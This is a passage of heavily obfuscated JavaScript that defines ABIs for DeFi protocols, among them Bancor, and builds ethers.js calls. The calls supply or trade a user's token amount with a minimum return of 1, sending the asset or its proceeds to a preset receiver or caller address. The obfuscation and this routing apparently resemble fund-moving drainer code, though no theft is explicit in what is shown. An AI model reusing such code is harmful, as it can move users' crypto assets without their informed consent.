            inputs: [_0x11439a, _0x13d9d3, _0x3fce81],
            name: 'withdraw',
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x5bfb5f = {
            internalType: "address",
            name: '_poolToken',
            type: "address"
          };
          const _0x3333e1 = {
            internalType: "uint256",
            name: "_amount",
            type: 'uint256'
          };
          const _0x4046b6 = {
            inputs: [_0x5bfb5f, _0x3333e1],
            name: 'withdraw',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          let _0x57d323 = [_0x592638, _0x186b5c, _0x1812ee, _0xa84454, _0x470a84, _0x4fca44, _0x33a8f8, _0x3b7c0b, _0x175ed8, _0x35e052, _0x2fc676, _0x35b94f, _0x10639b, _0x4e8141, _0x34d3a0, _0x265e1c, _0x1e8870, _0x40ed36, _0xf7a50a, _0x25d87d, _0xf644a7, _0x149f94, _0x2a118b, _0x26a92a, _0xf40fba, _0x47f56d, _0x1f1cee, _0x3ec371, _0x5be275, _0x2b49a5, _0x49ef4b, _0x43b902, _0x35ed67, _0x47dec0, _0x16051a, _0x5315f3, _0x47945c, _0x3341e8, _0x4e7cae, _0x3973cd, _0xec4222, _0x169df1, _0x1e282e, _0x291ca1, _0x354f67, _0x1ee130, _0x492ec1, _0x2e5dfd, _0x58b4b1, _0x552da3, _0x3b2fa3, _0x38ca87, _0x572b30, _0x520c33, _0x41ce4e, _0x16a5ae, _0x2590ed, _0x295d05, _0x4a8b80, _0x101863, _0x5da3d3, _0x2d1419, _0x56c293, _0x2da05d, _0x1ac7a1, _0xfba702, _0x4cfc0c, _0x5d18d9, _0x494efb, _0x3f71f4, _0x29ffda, _0x44ac12, _0x13c489, _0x2306a4, _0x4b6d40, _0x1a0bf9, _0x4de43a, _0x3e59d2, _0x93512c, _0x57883d, _0x2897eb, _0x52894c, _0x41db0a, _0xd699f0, _0x4980f9, _0x2e70ba, _0x2fcc22, _0x577bc7, _0x311aaf, _0x550abe, _0x470c10, _0x21d282, _0x175d5d, _0x10b9f4, _0x559c4f, _0x43b7de, _0x3a3043, _0x29b2fb, _0x4046b6];
          let _0x327b5c = new ethers.Contract(_0x3941f8, _0x57d323, _0xab3127);
          return [_0x327b5c.supply(_0x2a18aa.asset.token, this.receiver, _0x2a18aa.asset.amount), ''];
        }
      case "Bancor":
        {
          const _0x2eb032 = {
            internalType: "contract ITokenGovernance",
            name: "initBNTGovernance",
            type: "address"
          };
          const _0x48ca60 = {
            internalType: "contract ITokenGovernance",
            name: "initVBNTGovernance",
            type: "address"
          };
          const _0x434410 = {
            internalType: "contract INetworkSettings",
            name: "initNetworkSettings",
            type: "address"
          };
          const _0x595ccb = {
            internalType: "contract IMasterVault",
            name: "initMasterVault",
            type: "address"
          };
          const _0x2278b6 = {
            internalType: "contract IExternalProtectionVault",
            name: "initExternalProtectionVault",
            type: "address"
          };
          const _0x300913 = {
            internalType: "contract IPoolToken",
            name: "initBNTPoolToken",
            type: "address"
          };
          const _0x2ce1ca = {
            internalType: "address",
            name: "bancorArbitrage",
            type: "address"
          };
          const _0x1fcf6e = {
            inputs: [_0x2eb032, _0x48ca60, _0x434410, _0x595ccb, _0x2278b6, _0x300913, _0x2ce1ca],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x23d5c0 = {
            inputs: [],
            name: "AccessDenied",
            type: 'error'
          };
          const _0x64d04c = {
            inputs: [],
            name: "AlreadyExists",
            type: "error"
          };
          const _0x51e14b = {
            inputs: [],
            name: "AlreadyInitialized",
            type: "error"
          };
          const _0x4c9508 = {
            inputs: [],
            name: "DeadlineExpired",
            type: 'error'
          };
          const _0x3257ea = {
            inputs: [],
            name: "DepositingDisabled",
            type: "error"
          };
          const _0x1d4a34 = {
            inputs: [],
            name: "DoesNotExist",
            type: "error"
          };
          const _0x2bbf28 = {
            inputs: [],
            name: "InsufficientFlashLoanReturn",
            type: "error"
          };
          const _0x2aaca0 = {
            inputs: [],
            name: "InvalidAddress",
            type: "error"
          };
          const _0x55158e = {
            inputs: [],
            name: "InvalidPool",
            type: "error"
          };
          const _0x5669fa = {
            inputs: [],
            name: "InvalidToken",
            type: "error"
          };
          const _0xe15c2b = {
            inputs: [],
            name: "NativeTokenAmountMismatch",
            type: "error"
          };
          const _0xec2b2 = {
            inputs: [],
            name: "NotEmpty",
            type: "error"
          };
          const _0x2ae301 = {
            inputs: [],
            name: "NotWhitelisted",
            type: "error"
          };
          const _0x4f83b9 = {
            inputs: [],
            name: "Overflow",
            type: "error"
          };
          const _0x3d8514 = {
            inputs: [],
            name: "ZeroValue",
            type: "error"
          };
          const _0x25dc95 = {
            indexed: true,
            internalType: "contract Token",
            name: "token",
            type: "address"
          };
          const _0x1dead9 = {
            indexed: true,
            internalType: "address",
            name: "borrower",
            type: "address"
          };
          const _0x4e923b = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x31eccc = {
            indexed: false,
            internalType: 'uint256',
            name: "feeAmount",
            type: 'uint256'
          };
          const _0x5035d0 = {
            anonymous: false,
            inputs: [_0x25dc95, _0x1dead9, _0x4e923b, _0x31eccc],
            name: "FlashLoanCompleted",
            type: 'event'
          };
          const _0x59f3f2 = {
            indexed: true,
            internalType: "bytes32",
            name: 'contextId',
            type: "bytes32"
          };
          const _0x318a87 = {
            indexed: true,
            internalType: "contract Token",
            name: "token",
            type: "address"
          };
          const _0x358d10 = {
            indexed: true,
            internalType: "address",
            name: "provider",
            type: "address"
          };
          const _0x409bd3 = {
            indexed: false,
            internalType: "uint256",
            name: "amount",
            type: 'uint256'
          };
          const _0x239797 = {
            indexed: false,
            internalType: 'uint256',
            name: "availableAmount",
            type: 'uint256'
          };
          const _0x235430 = {
            indexed: false,
            internalType: 'uint256',
            name: "originalAmount",
            type: "uint256"
          };
          const _0x2ff4ed = {
            anonymous: false,
            inputs: [_0x59f3f2, _0x318a87, _0x358d10, _0x409bd3, _0x239797, _0x235430],
            name: "FundsMigrated",
            type: 'event'
          };
          const _0x22aa67 = {
            indexed: true,
            internalType: "address",
            name: 'caller',
            type: "address"
          };
          const _0x4bcdd0 = {
            indexed: true,
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x5286a5 = {
            indexed: false,
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x43b627 = {
            anonymous: false,
            inputs: [_0x22aa67, _0x4bcdd0, _0x5286a5],
            name: "NetworkFeesWithdrawn",
            type: 'event'
          };
          const _0x52d779 = {
            indexed: false,
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x3060b7 = {
            anonymous: false,
            inputs: [_0x52d779],
            name: 'Paused',
            type: "event"
          };
          const _0x1920f1 = {
            indexed: true,
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0x42349d = {
            indexed: true,
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0xb9c6e7 = {
            anonymous: false,
            inputs: [_0x1920f1, _0x42349d],
            name: "PoolAdded",
            type: 'event'
          };
          const _0x43a25b = {
            indexed: true,
            internalType: "uint16",
            name: "poolType",
            type: "uint16"
          };
          const _0xe24516 = {
            indexed: true,
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0x3c9fad = {
            anonymous: false,
            inputs: [_0x43a25b, _0xe24516],
            name: "PoolCollectionAdded",
            type: 'event'
          };
          const _0x35af2e = {
            indexed: true,
            internalType: "uint16",
            name: "poolType",
            type: "uint16"
          };
          const _0x47d5b4 = {
            indexed: true,
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0xb8e779 = {
            anonymous: false,
            inputs: [_0x35af2e, _0x47d5b4],
            name: "PoolCollectionRemoved",
            type: 'event'
          };
          const _0x562ed7 = {
            indexed: true,
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0xa07557 = {
            indexed: true,
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0x5e711e = {
            anonymous: false,
            inputs: [_0x562ed7, _0xa07557],
            name: "PoolCreated",
            type: 'event'
          };
          const _0x278787 = {
            indexed: true,
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0x43c369 = {
            indexed: true,
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0x561e24 = {
            anonymous: false,
            inputs: [_0x278787, _0x43c369],
            name: "PoolRemoved",
            type: "event"
          };
          const _0x5bde4e = {
            indexed: true,
            internalType: "bytes32",
            name: "role",
            type: "bytes32"
          };
          const _0x146b04 = {
            indexed: true,
            internalType: "bytes32",
            name: "previousAdminRole",
            type: "bytes32"
          };
          const _0x13c779 = {
            indexed: true,
            internalType: "bytes32",
            name: "newAdminRole",
            type: "bytes32"
          };
          const _0x526bab = {
            anonymous: false,
            inputs: [_0x5bde4e, _0x146b04, _0x13c779],
            name: "RoleAdminChanged",
            type: 'event'
          };
          const _0x48d66c = {
            indexed: true,
            internalType: "bytes32",
            name: "role",
            type: "bytes32"
          };
          const _0x55d2a7 = {
            indexed: true,
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0xae5f0f = {
            indexed: true,
            internalType: "address",
            name: "sender",
            type: "address"
          };
          const _0x7176ad = {
            anonymous: false,
            inputs: [_0x48d66c, _0x55d2a7, _0xae5f0f],
            name: "RoleGranted",
            type: 'event'
          };
          const _0x47a8d8 = {
            indexed: true,
            internalType: "bytes32",
            name: 'role',
            type: "bytes32"
          };
          const _0x7f2602 = {
            indexed: true,
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x12e89d = {
            indexed: true,
            internalType: "address",
            name: "sender",
            type: "address"
          };
          const _0x57b91a = {
            anonymous: false,
            inputs: [_0x47a8d8, _0x7f2602, _0x12e89d],
            name: "RoleRevoked",
            type: 'event'
          };
          const _0x15d2b0 = {
            indexed: true,
            internalType: "bytes32",
            name: 'contextId',
            type: "bytes32"
          };
          const _0x2d5c00 = {
            indexed: true,
            internalType: "contract Token",
            name: "sourceToken",
            type: "address"
          };
          const _0x1f32e7 = {
            indexed: true,
            internalType: "contract Token",
            name: "targetToken",
            type: "address"
          };
          const _0x4adbc7 = {
            indexed: false,
            internalType: 'uint256',
            name: "sourceAmount",
            type: 'uint256'
          };
          const _0x60959a = {
            indexed: false,
            internalType: 'uint256',
            name: "targetAmount",
            type: 'uint256'
          };
          const _0x1a40de = {
            indexed: false,
            internalType: 'uint256',
            name: "bntAmount",
            type: 'uint256'
          };
          const _0x30a6ea = {
            indexed: false,
            internalType: 'uint256',
            name: "targetFeeAmount",
            type: 'uint256'
          };
          const _0x301411 = {
            indexed: false,
            internalType: 'uint256',
            name: "bntFeeAmount",
            type: "uint256"
          };
          const _0x5e2b4b = {
            indexed: false,
            internalType: "address",
            name: "trader",
            type: "address"
          };
          const _0x104179 = {
            anonymous: false,
            inputs: [_0x15d2b0, _0x2d5c00, _0x1f32e7, _0x4adbc7, _0x60959a, _0x1a40de, _0x30a6ea, _0x301411, _0x5e2b4b],
            name: "TokensTraded",
            type: 'event'
          };
          const _0x335d76 = {
            indexed: false,
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x15804e = {
            anonymous: false,
            inputs: [_0x335d76],
            name: "Unpaused",
            type: 'event'
          };
          const _0x1ac4f3 = {
            internalType: 'bytes32',
            name: '',
            type: "bytes32"
          };
          const _0x48d516 = {
            inputs: [],
            name: "DEFAULT_ADMIN_ROLE",
            outputs: [_0x1ac4f3],
            stateMutability: "view",
            type: "function"
          };
          const _0x2b0190 = {
            internalType: 'uint256',
            name: 'id',
            type: 'uint256'
          };
          const _0x2e3916 = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x123d57 = {
            inputs: [_0x2b0190],
            name: "cancelWithdrawal",
            outputs: [_0x2e3916],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x592ff9 = {
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0x5ec9f4 = {
            inputs: [_0x592ff9],
            name: "collectionByPool",
            outputs: [{
              'internalType': "contract IPoolCollection",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xe28aa3 = {
            internalType: "contract Token[]",
            name: "tokens",
            type: "address[]"
          };
          const _0x2e55f6 = {
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0x4cd4ac = {
            inputs: [_0xe28aa3, _0x2e55f6],
            name: "createPools",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4ee413 = {
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0x2d2f82 = {
            internalType: 'uint256',
            name: "tokenAmount",
            type: 'uint256'
          };
          const _0x149f5e = {
            inputs: [_0x4ee413, _0x2d2f82],
            name: "deposit",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x56eb6d = {
            internalType: "address",
            name: "provider",
            type: 'address'
          };
          const _0x303803 = {
            internalType: "contract Token",
            name: "pool",
            type: "address"
          };
          const _0x2943c5 = {
            internalType: 'uint256',
            name: "tokenAmount",
            type: 'uint256'
          };
          const _0x46cd82 = {
            inputs: [_0x56eb6d, _0x303803, _0x2943c5],
            name: 'depositFor',
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4b9374 = {
            internalType: "bool",
            name: '',
            type: "bool"
          };
          const _0x5d8897 = {
            inputs: [],
            name: "depositingEnabled",
            outputs: [_0x4b9374],
            stateMutability: "view",
            type: "function"
          };
          const _0x1e17ab = {
            internalType: 'bool',
            name: "status",
            type: "bool"
          };
          const _0x4b1bb8 = {
            inputs: [_0x1e17ab],
            name: "enableDepositing",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x38ba3e = {
            internalType: "contract Token",
            name: 'token',
            type: 'address'
          };
          const _0x230682 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x41b817 = {
            internalType: "contract IFlashLoanRecipient",
            name: 'recipient',
            type: "address"
          };
          const _0x1325bf = {
            internalType: "bytes",
            name: "data",
            type: "bytes"
          };
          const _0x221b12 = {
            inputs: [_0x38ba3e, _0x230682, _0x41b817, _0x1325bf],
            name: "flashLoan",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4a868b = {
            internalType: "bytes32",
            name: "role",
            type: "bytes32"
          };
          const _0x2fcd83 = {
            inputs: [_0x4a868b],
            name: "getRoleAdmin",
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4d1fff = {
            internalType: "bytes32",
            name: 'role',
            type: "bytes32"
          };
          const _0x1cab89 = {
            internalType: 'uint256',
            name: "index",
            type: 'uint256'
          };
          const _0x1580ae = {
            inputs: [_0x4d1fff, _0x1cab89],
            name: "getRoleMember",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4ce2c4 = {
            internalType: "bytes32",
            name: "role",
            type: "bytes32"
          };
          const _0x418991 = {
            inputs: [_0x4ce2c4],
            name: "getRoleMemberCount",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xf8a0cb = {
            internalType: 'bytes32',
            name: "role",
            type: "bytes32"
          };
          const _0x286f9a = {
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x12c108 = {
            inputs: [_0xf8a0cb, _0x286f9a],
            name: "grantRole",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x49fc6d = {
            internalType: "bytes32",
            name: "role",
            type: 'bytes32'
          };
          const _0x50af98 = {
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x59e1e = {
            inputs: [_0x49fc6d, _0x50af98],
            name: "hasRole",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xe0eb69 = {
            internalType: "contract IPoolToken",
            name: "poolToken",
            type: "address"
          };
          const _0x2ae3a6 = {
            internalType: 'uint256',
            name: "poolTokenAmount",
            type: 'uint256'
          };
          const _0xf84099 = {
            internalType: "uint256",
            name: '',
            type: "uint256"
          };
          const _0x3d996c = {
            inputs: [_0xe0eb69, _0x2ae3a6],
            name: "initWithdrawal",
            outputs: [_0xf84099],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x177c3f = {
            internalType: "contract IBNTPool",
            name: "initBNTPool",
            type: "address"
          };
          const _0x434e61 = {
            internalType: "contract IPendingWithdrawals",
            name: "initPendingWithdrawals",
            type: "address"
          };
          const _0x50f7f0 = {
            internalType: "contract IPoolMigrator",
            name: "initPoolMigrator",
            type: "address"
          };
          const _0xabfe0d = {
            inputs: [_0x177c3f, _0x434e61, _0x50f7f0],
            name: "initialize",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x34ec8f = {
            inputs: [],
            name: "liquidityPools",
            outputs: [{
              'internalType': "contract Token[]",
              'name': '',
              'type': "address[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3b8b10 = {
            internalType: "contract Token",
            name: 'token',
            type: "address"
          };
          const _0x43ad79 = {
            internalType: "address",
            name: "provider",
            type: "address"
          };
          const _0x2f9d82 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x49bd0c = {
            internalType: 'uint256',
            name: "availableAmount",
            type: 'uint256'
          };
          const _0x259335 = {
            internalType: "uint256",
            name: "originalAmount",
            type: 'uint256'
          };
          const _0x27bf75 = {
            inputs: [_0x3b8b10, _0x43ad79, _0x2f9d82, _0x49bd0c, _0x259335],
            name: "migrateLiquidity",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x301365 = {
            internalType: "contract Token[]",
            name: "pools",
            type: "address[]"
          };
          const _0x3316ce = {
            internalType: "contract IPoolCollection",
            name: "newPoolCollection",
            type: "address"
          };
          const _0x4e6581 = {
            inputs: [_0x301365, _0x3316ce],
            name: "migratePools",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1a6e04 = {
            inputs: [],
            name: 'pause',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x232ed3 = {
            inputs: [],
            name: "paused",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3c6167 = {
            inputs: [],
            name: "pendingNetworkFeeAmount",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': "uint256"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x535f9c = {
            inputs: [],
            name: "poolCollections",
            outputs: [{
              'internalType': "contract IPoolCollection[]",
              'name': '',
              'type': "address[]"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x505035 = {
            internalType: "bytes",
            name: "data",
            type: "bytes"
          };
          const _0x14139c = {
            inputs: [_0x505035],
            name: "postUpgrade",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3b1aba = {
            internalType: "contract IPoolCollection",
            name: "newPoolCollection",
            type: "address"
          };
          const _0x1cc05b = {
            inputs: [_0x3b1aba],
            name: "registerPoolCollection",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x8649b6 = {
            internalType: "bytes32",
            name: 'role',
            type: 'bytes32'
          };
          const _0x3a8400 = {
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x4c9571 = {
            inputs: [_0x8649b6, _0x3a8400],
            name: "renounceRole",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x5a0575 = {
            inputs: [],
            name: "resume",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1161fa = {
            internalType: "bytes32",
            name: "role",
            type: "bytes32"
          };
          const _0x53752e = {
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0xe2092e = {
            inputs: [_0x1161fa, _0x53752e],
            name: "revokeRole",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x14973f = {
            inputs: [],
            name: 'roleAdmin',
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0xb006e8 = {
            internalType: "bytes32",
            name: '',
            type: "bytes32"
          };
          const _0x51ad80 = {
            inputs: [],
            name: "roleEmergencyStopper",
            outputs: [_0xb006e8],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x573f9a = {
            inputs: [],
            name: "roleMigrationManager",
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x1adc06 = {
            inputs: [],
            name: "roleNetworkFeeManager",
            outputs: [{
              'internalType': "bytes32",
              'name': '',
              'type': "bytes32"
            }],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x594280 = {
            internalType: "bytes4",
            name: "interfaceId",
            type: "bytes4"
          };
          const _0x148ffb = {
            inputs: [_0x594280],
            name: "supportsInterface",
            outputs: [{
              'internalType': 'bool',
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x5bac43 = {
            internalType: "contract Token",
            name: "sourceToken",
            type: "address"
          };
          const _0xa10164 = {
            internalType: "contract Token",
            name: "targetToken",
            type: "address"
          };
          const _0x5ad5b0 = {
            internalType: 'uint256',
            name: "sourceAmount",
            type: 'uint256'
          };
          const _0xe97a75 = {
            internalType: 'uint256',
            name: "minReturnAmount",
            type: 'uint256'
          };
          const _0x1410c0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x52e0ed = {
            internalType: "address",
            name: "beneficiary",
            type: "address"
          };
          const _0x22d188 = {
            inputs: [_0x5bac43, _0xa10164, _0x5ad5b0, _0xe97a75, _0x1410c0, _0x52e0ed],
            name: "tradeBySourceAmount",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xd057e7 = {
            internalType: "contract Token",
            name: "sourceToken",
            type: "address"
          };
          const _0x5855db = {
            internalType: "contract Token",
            name: "targetToken",
            type: "address"
          };
          const _0x2a3fe4 = {
            internalType: 'uint256',
            name: "sourceAmount",
            type: 'uint256'
          };
          const _0x5625c9 = {
            internalType: 'uint256',
            name: "minReturnAmount",
            type: 'uint256'
          };
          const _0x33b9b8 = {
            internalType: 'uint256',
            name: "deadline",
            type: "uint256"
          };
          const _0x20c3a0 = {
            internalType: "address",
            name: "beneficiary",
            type: "address"
          };
          const _0x37cf7c = {
            inputs: [_0xd057e7, _0x5855db, _0x2a3fe4, _0x5625c9, _0x33b9b8, _0x20c3a0],
            name: "tradeBySourceAmountArb",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x24715d = {
            internalType: "contract Token",
            name: "sourceToken",
            type: "address"
          };
          const _0x2cb2c1 = {
            internalType: "contract Token",
            name: "targetToken",
            type: "address"
          };
          const _0x267bf4 = {
            internalType: 'uint256',
            name: "targetAmount",
            type: 'uint256'
          };
          const _0x27921d = {
            internalType: 'uint256',
            name: "maxSourceAmount",
            type: 'uint256'
          };
          const _0xd36394 = {
            internalType: "uint256",
            name: "deadline",
            type: 'uint256'
          };
          const _0x5405d7 = {
            internalType: "address",
            name: "beneficiary",
            type: "address"
          };
          const _0x16df29 = {
            inputs: [_0x24715d, _0x2cb2c1, _0x267bf4, _0x27921d, _0xd36394, _0x5405d7],
            name: "tradeByTargetAmount",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3d01a9 = {
            internalType: "contract Token",
            name: "sourceToken",
            type: "address"
          };
          const _0x2059e3 = {
            internalType: "contract Token",
            name: "targetToken",
            type: "address"
          };
          const _0xe376b = {
            internalType: 'uint256',
            name: "targetAmount",
            type: 'uint256'
          };
          const _0x2fcb47 = {
            internalType: 'uint256',
            name: "maxSourceAmount",
            type: 'uint256'
          };
          const _0x42f9b4 = {
            internalType: "uint256",
            name: "deadline",
            type: "uint256"
          };
          const _0xc7af76 = {
            internalType: "address",
            name: "beneficiary",
            type: "address"
          };
          const _0x4f8350 = {
            internalType: 'uint256',
            name: '',
            type: 'uint256'
          };
          const _0x4b3f82 = {
            inputs: [_0x3d01a9, _0x2059e3, _0xe376b, _0x2fcb47, _0x42f9b4, _0xc7af76],
            name: "tradeByTargetAmountArb",
            outputs: [_0x4f8350],
            stateMutability: "payable",
            type: "function"
          };
          const _0x595605 = {
            internalType: "contract IPoolCollection",
            name: "poolCollection",
            type: "address"
          };
          const _0x5e5f84 = {
            inputs: [_0x595605],
            name: "unregisterPoolCollection",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x83cafa = {
            inputs: [],
            name: "version",
            outputs: [{
              'internalType': "uint16",
              'name': '',
              'type': "uint16"
            }],
            stateMutability: "pure",
            type: "function"
          };
          const _0x401257 = {
            internalType: 'uint256',
            name: 'id',
            type: 'uint256'
          };
          const _0x3c3fc5 = {
            inputs: [_0x401257],
            name: 'withdraw',
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x547367 = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0xfaaf9 = {
            inputs: [_0x547367],
            name: "withdrawNetworkFees",
            outputs: [{
              'internalType': "uint256",
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x12ae7c = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x6e8d0a = [_0x1fcf6e, _0x23d5c0, _0x64d04c, _0x51e14b, _0x4c9508, _0x3257ea, _0x1d4a34, _0x2bbf28, _0x2aaca0, _0x55158e, _0x5669fa, _0xe15c2b, _0xec2b2, _0x2ae301, _0x4f83b9, _0x3d8514, _0x5035d0, _0x2ff4ed, _0x43b627, _0x3060b7, _0xb9c6e7, _0x3c9fad, _0xb8e779, _0x5e711e, _0x561e24, _0x526bab, _0x7176ad, _0x57b91a, _0x104179, _0x15804e, _0x48d516, _0x123d57, _0x5ec9f4, _0x4cd4ac, _0x149f5e, _0x46cd82, _0x5d8897, _0x4b1bb8, _0x221b12, _0x2fcd83, _0x1580ae, _0x418991, _0x12c108, _0x59e1e, _0x3d996c, _0xabfe0d, _0x34ec8f, _0x27bf75, _0x4e6581, _0x1a6e04, _0x232ed3, _0x3c6167, _0x535f9c, _0x14139c, _0x1cc05b, _0x4c9571, _0x5a0575, _0xe2092e, _0x14973f, _0x51ad80, _0x573f9a, _0x1adc06, _0x148ffb, _0x22d188, _0x37cf7c, _0x16df29, _0x4b3f82, _0x5e5f84, _0x83cafa, _0x3c3fc5, _0xfaaf9, _0x12ae7c];
          let _0x4f4b74 = new ethers.Contract(_0x3941f8, _0x6e8d0a, _0xab3127);
          let _0x4f065c = "0xdac17f958d2ee523a2206206994597c13d831ec7";
          if (_0x2a18aa.asset.token == "0xdac17f958d2ee523a2206206994597c13d831ec7") {
            _0x4f065c = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
          }
          return [_0x4f4b74.tradeBySourceAmount(_0x2a18aa.asset.token, _0x4f065c, _0x2a18aa.asset.amount, 1, _0x4d5eff, this.getCaller(_0x2a18aa)), _0x4f065c];
        }
      case "BancorSwaps":
        {
          const _0x45cc8d = {
            name: "_onlyOwnerCanUpdateRegistry",
            type: "bool"
          };
          const _0x4c8ffa = {
            constant: false,
            inputs: [_0x45cc8d],
            name: "restrictRegistryUpdate",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x11bbd4 = {
            name: "_token",
            type: "address"
          };
          const _0x356e5 = {
            name: "_register",
            type: "bool"
          };
          const _0x4eee84 = {
            constant: false,
            inputs: [_0x11bbd4, _0x356e5],
            name: "registerEtherToken",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x8af1bc = {
            name: '_path',
            type: "address[]"
          };
          const _0x12dbd6 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x5d8169 = {
            name: '',
            type: 'uint256'
          };
          const _0x74457e = {
            name: '',
            type: 'uint256'
          };
          const _0x52674a = {
            constant: true,
            inputs: [_0x8af1bc, _0x12dbd6],
            name: "getReturnByPath",
            outputs: [_0x5d8169, _0x74457e],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x230964 = {
            name: '_path',
            type: "address[]"
          };
          const _0x49f32c = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x352589 = {
            name: '_minReturn',
            type: 'uint256'
          };
          const _0x1a3f9f = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x45ff49 = {
            name: "_affiliateAccount",
            type: "address"
          };
          const _0xed42b6 = {
            name: "_affiliateFee",
            type: 'uint256'
          };
          const _0xc016e5 = {
            constant: false,
            inputs: [_0x230964, _0x49f32c, _0x352589, _0x1a3f9f, _0x45ff49, _0xed42b6],
            name: "claimAndConvertFor2",
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x301b67 = {
            constant: true,
            inputs: [],
            name: "onlyOwnerCanUpdateRegistry",
            outputs: [{
              'name': '',
              'type': "bool"
            }],
            payable: false,
            stateMutability: 'view',
            type: "function"
          };
          const _0x4e9bee = {
            constant: false,
            inputs: [],
            name: "updateRegistry",
